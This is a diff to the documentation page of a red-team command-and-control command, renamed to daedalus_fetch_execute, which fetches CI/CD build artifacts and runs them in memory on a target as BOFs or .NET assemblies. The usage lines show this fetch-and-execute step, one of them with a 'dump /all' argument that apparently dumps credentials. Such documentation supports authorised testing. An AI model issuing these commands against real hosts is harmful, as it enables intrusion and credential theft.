@@ -1,5 +1,5 @@
 +++
-title = "fetch_execute"
+title = "daedalus_fetch_execute"
 chapter = false
 weight = 100
 hidden = false
@@ -9,7 +9,7 @@ hidden = false
 Fetch a CI/CD build artifact from any supported provider (Jenkins, GitHub Actions, GitLab CI, Forgejo, Gitea) and execute it in-memory on the target callback. Supports BOFs and .NET assemblies.
 
 - Needs Admin: False
-- Version: 2
+- Version: 3
 - Author: @Lavender-exe
 
 ### Arguments
@@ -71,8 +71,8 @@ Each provider has optional credential overrides. These override Mythic Secrets a
 ## Usage
 
 ```
-fetch_execute -provider jenkins -job loader-c-mingw -build_id lastSuccessfulBuild -tool_type bof
-fetch_execute -provider github -job build.yml -build_id latest -tool_type assembly -assembly_args "dump /all"
+daedalus_fetch_execute -job loader-c-mingw -tool_type bof
+daedalus_fetch_execute -provider github -job build.yml -build_id latest -tool_type assembly -assembly_args "dump /all"
 ```
 
 ## MITRE ATT&CK Mapping
